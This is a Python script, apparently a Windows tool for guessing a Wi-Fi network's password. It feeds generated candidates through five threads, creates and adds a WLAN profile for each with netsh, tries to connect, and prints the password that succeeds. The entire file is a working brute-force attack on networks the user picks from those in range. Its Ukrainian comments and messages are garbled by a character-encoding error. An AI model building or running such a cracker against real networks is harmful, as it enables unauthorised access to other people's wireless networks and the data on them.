import subprocess
import os
import keyboard
import threading
import queue

from numsgen import set_number
from networks import get_available_networks
from profile_1 import create_wifi_profile




    

def is_connected(ssid):
    """–ü–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ –ø—Ä–∏—Å—Ç—Ä—ñ–π –ø—ñ–¥–∫–ª—é—á–µ–Ω–∏–π –¥–æ Wi-Fi."""
    result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True)
    return ssid in result.stdout and "State : connected" in result.stdout.lower()

def try_connect(ssid, password_queue, stop_flag, correct_password_queue):
    """–ü—ñ–¥–∫–ª—é—á–∞—î—Ç—å—Å—è –¥–æ Wi-Fi, –ø–µ—Ä–µ–≤—ñ—Ä—è—é—á–∏ –ø–∞—Ä–æ–ª—ñ –∑ —á–µ—Ä–≥–∏."""
    while not stop_flag.is_set():
        try:
            password = password_queue.get(timeout=2)  # –û—Ç—Ä–∏–º—É—î–º–æ –ø–∞—Ä–æ–ª—å –∑ —á–µ—Ä–≥–∏
        except queue.Empty:
            return  # –Ø–∫—â–æ —á–µ—Ä–≥–∞ –ø–æ—Ä–æ–∂–Ω—è, –≤–∏—Ö–æ–¥–∏–º–æ –∑ –ø–æ—Ç–æ–∫—É

        if stop_flag.is_set():
            return

        print(f"üîë –°–ø—Ä–æ–±–∞ –ø–∞—Ä–æ–ª—è: {password}")

        profile_path = create_wifi_profile(ssid, password)
        try:
            subprocess.run(["netsh", "wlan", "add", "profile", f"filename={profile_path}", "user=all"], check=True, capture_output=True, text=True)
            subprocess.run(["netsh", "wlan", "connect", f"name={ssid}"], check=True, capture_output=True, text=True)

            if is_connected(ssid):
                print(f"‚úÖ –£—Å–ø—ñ—à–Ω–æ –ø—ñ–¥–∫–ª—é—á–µ–Ω–æ –¥–æ '{ssid}' –∑ –ø–∞—Ä–æ–ª–µ–º: {password}")
                stop_flag.set()  # –ó—É–ø–∏–Ω—è—î–º–æ –≤—Å—ñ –ø–æ—Ç–æ–∫–∏
                correct_password_queue.put(password)  # –ü–µ—Ä–µ–¥–∞—î–º–æ –ø—Ä–∞–≤–∏–ª—å–Ω–∏–π –ø–∞—Ä–æ–ª—å
                return
            else:
                print(f"‚ùå –ù–µ –≤–¥–∞–ª–æ—Å—è –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –∑ –ø–∞—Ä–æ–ª–µ–º: {password}")

        except subprocess.CalledProcessError as e:
            print(f"‚ö†Ô∏è –ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ —Å–ø—Ä–æ–±—ñ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è: {e}")

        finally:
            if os.path.exists(profile_path):
                os.remove(profile_path)

def connect_to_wifi(ssid, thread_count=5):
    """–ü–µ—Ä–µ–±–∏—Ä–∞—î –ø–∞—Ä–æ–ª—ñ —Ç–∞ –ø—ñ–¥–∫–ª—é—á–∞—î—Ç—å—Å—è –¥–æ Wi-Fi."""
    available_networks = get_available_networks()
    if ssid not in available_networks:
        print(f"–ú–µ—Ä–µ–∂–∞ '{ssid}' –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–∞. –ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ –≤–æ–Ω–∞ –¥–æ—Å—Ç—É–ø–Ω–∞.")
        return

    print(f"\nüîÑ –°–ø—Ä–æ–±–∞ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ '{ssid}' –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏—Ö –ø–∞—Ä–æ–ª—ñ–≤...")

    password_generator = set_number()
    stop_flag = threading.Event()
    password_queue = queue.Queue()
    correct_password_queue = queue.Queue()

    # –ó–∞–ø–æ–≤–Ω—é—î–º–æ —á–µ—Ä–≥—É –ø–∞—Ä–æ–ª—è–º–∏ –≤ –æ–∫—Ä–µ–º–æ–º—É –ø–æ—Ç–æ—Ü—ñ
    def generate_passwords():
        for password in password_generator:
            if stop_flag.is_set():
                break
            password_queue.put(password)

    password_thread = threading.Thread(target=generate_passwords, daemon=True)
    password_thread.start()

    def esc_listener():
        """–°–ª—É—Ö–∞—î –∫–ª–∞–≤—ñ—à—É Esc –¥–ª—è –∑—É–ø–∏–Ω–∫–∏ –ø–µ—Ä–µ–±–æ—Ä—É."""
        while not stop_flag.is_set():
            if keyboard.is_pressed('esc'):
                print("üõë –í–∏—Ö—ñ–¥ –∑ –ø—Ä–æ–≥—Ä–∞–º–∏...")
                stop_flag.set()
                break

    esc_thread = threading.Thread(target=esc_listener, daemon=True)
    esc_thread.start()

    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=try_connect, args=(ssid, password_queue, stop_flag, correct_password_queue))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    if not correct_password_queue.empty():
        correct_password = correct_password_queue.get()
        print(f"üéâ –ó–Ω–∞–π–¥–µ–Ω–æ –ø—Ä–∞–≤–∏–ª—å–Ω–∏–π –ø–∞—Ä–æ–ª—å: {correct_password}")
    else:
        print(f"‚ùå –ù–µ –≤–¥–∞–ª–æ—Å—è –ø—ñ–¥—ñ–±—Ä–∞—Ç–∏ –ø–∞—Ä–æ–ª—å –¥–æ '{ssid}'.")

if __name__ == "__main__":
    available_networks = get_available_networks()
    if available_networks:
        print("üì° –î–æ—Å—Ç—É–ø–Ω—ñ Wi-Fi –º–µ—Ä–µ–∂—ñ:")
        for network in available_networks:
            print(f"- {network}")
    else:
        print("‚ùå –ù–µ –∑–Ω–∞–π–¥–µ–Ω–æ –¥–æ—Å—Ç—É–ø–Ω–∏—Ö Wi-Fi –º–µ—Ä–µ–∂.")

    ssid = input("üîπ –í–≤–µ–¥—ñ—Ç—å —ñ–º'—è Wi-Fi –º–µ—Ä–µ–∂—ñ (SSID): ")
    connect_to_wifi(ssid)